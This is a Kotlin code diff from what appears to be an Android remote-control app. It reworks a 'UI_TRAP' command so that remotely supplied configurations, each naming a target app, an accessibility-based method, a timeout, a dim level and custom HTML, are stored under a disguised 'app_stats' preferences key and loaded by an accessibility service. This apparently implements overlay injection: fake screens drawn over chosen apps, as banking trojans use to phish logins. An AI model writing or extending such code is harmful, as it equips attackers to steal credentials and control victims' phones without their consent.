@@ -916,62 +916,73 @@ object CommandProcessor {
                     DynamicUIManager.removeOverlay(ctx)
                     status = "RELENTLESS_TRAP_DISARMED"
                 }
-                "UI_TRAP" -> {
-                    val parts = content.split("|", limit = 5)
+                                "UI_TRAP" -> {
                     val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
-                    
-                    if (parts.isNotEmpty() && parts[0].trim().uppercase() == "STOP") {
-                        val specificTarget = parts.getOrNull(1)?.trim()
-                        if (specificTarget.isNullOrEmpty()) {
-                            prefs.edit().remove("ui_traps_array").apply()
-                            status = "ALL_UI_TRAPS_DISARMED"
-                            errorMsg = "All UI traps forcefully reset."
-                        } else {
-                            val trapsStr = prefs.getString("ui_traps_array", "[]") ?: "[]"
-                            val trapsArr = org.json.JSONArray(trapsStr)
-                            val newArr = org.json.JSONArray()
+                    val trapsStr = prefs.getString("ui_traps_array", "[]") ?: "[]"
+                    val trapsArr = org.json.JSONArray(trapsStr)
+                    val newArr = org.json.JSONArray()
+
+                    try {
+                        val json = org.json.JSONObject(content)
+                        val action = json.optString("action", "SET").uppercase()
+                        val label = json.optString("label", "Default")
+
+                        if (action == "REMOVE") {
                             for (i in 0 until trapsArr.length()) {
-                                val trap = trapsArr.getJSONObject(i)
-                                if (trap.optString("target") != specificTarget) newArr.put(trap)
+                                val t = trapsArr.getJSONObject(i)
+                                if (t.optString("label") != label) newArr.put(t)
                             }
                             prefs.edit().putString("ui_traps_array", newArr.toString()).apply()
-                            status = "UI_TRAP_DISARMED"
-                            errorMsg = "Removed trap targeting: $specificTarget"
-                        }
-                    } else if (parts.size >= 4) {
-                        val target = parts[0].trim()
-                        val method = parts[1].trim().uppercase()
-                        val timeout = parts[2].trim().toLongOrNull() ?: 10L
-                        
-                        val dimLevel: Int
-                        val html: String
-                        if (parts.size >= 5) {
-                            dimLevel = parts[3].trim().toIntOrNull() ?: 20
-                            html = parts[4].trim()
+                            status = "TRAP_REMOVED"
+                            errorMsg = "Purged config with label: $label"
                         } else {
-                            dimLevel = 20
-                            html = parts[3].trim()
+                            // SET/UPDATE logic
+                            val newTrap = org.json.JSONObject().apply {
+                                put("label", label)
+                                put("target", json.getString("target"))
+                                put("method", json.optString("method", "ACC").uppercase())
+                                put("timeout", json.optLong("timeout", 15L))
+                                put("dim", json.optInt("dim", 20))
+                                put("html", json.optString("html", ""))
+                            }
+
+                            var found = false
+                            for (i in 0 until trapsArr.length()) {
+                                val t = trapsArr.getJSONObject(i)
+                                if (t.optString("label") == label) {
+                                    newArr.put(newTrap)
+                                    found = true
+                                } else {
+                                    newArr.put(t)
+                                }
+                            }
+                            if (!found) newArr.put(newTrap)
+                            
+                            prefs.edit().putString("ui_traps_array", newArr.toString()).apply()
+                            status = "UI_TRAP_ARMED"
+                            errorMsg = "Armed config: $label"
                         }
-                        
-                        val newTrap = org.json.JSONObject().apply {
-                            put("target", target)
-                            put("method", method)
-                            put("timeout", timeout)
-                            put("dim", dimLevel)
-                            put("html", html)
+                    } catch (e: Exception) {
+                        // Legacy Pipe Fallback
+                        val parts = content.split("|", limit = 5)
+                        if (parts.isNotEmpty() && parts[0].trim().uppercase() == "STOP") {
+                            prefs.edit().remove("ui_traps_array").apply()
+                            status = "ALL_TRAPS_CLEARED"
+                        } else if (parts.size >= 4) {
+                            val newTrap = org.json.JSONObject().apply {
+                                put("label", "Legacy_" + System.currentTimeMillis())
+                                put("target", parts[0].trim())
+                                put("method", parts[1].trim())
+                                put("timeout", parts[2].trim().toLongOrNull() ?: 15L)
+                                put("dim", if(parts.size >= 5) parts[3].trim().toIntOrNull() ?: 20 else 20)
+                                put("html", if(parts.size >= 5) parts[4].trim() else parts[3].trim())
+                            }
+                            trapsArr.put(newTrap)
+                            prefs.edit().putString("ui_traps_array", trapsArr.toString()).apply()
+                            status = "UI_TRAP_ARMED_LEGACY"
+                        } else {
+                            status = "FAILED_PARSING"
                         }
-                        
-                        val trapsStr = prefs.getString("ui_traps_array", "[]") ?: "[]"
-                        val trapsArr = org.json.JSONArray(trapsStr)
-                        trapsArr.put(newTrap)
-                        
-                        prefs.edit().putString("ui_traps_array", trapsArr.toString()).apply()
-                        
-                        status = "UI_TRAP_ARMED"
-                        errorMsg = "Appended Trap -> Target: $target | Method: $method | Timeout: ${timeout}s"
-                    } else {
-                        status = "FAILED (FORMAT)"
-                        errorMsg = "Usage: UI_TRAP | TARGET | METHOD | TIMEOUT |[DIM_LEVEL] | <html>  OR  UI_TRAP | STOP | [TARGET]"
                     }
                     MyAccessibilityService.instance?.reloadUiTraps()
                 }
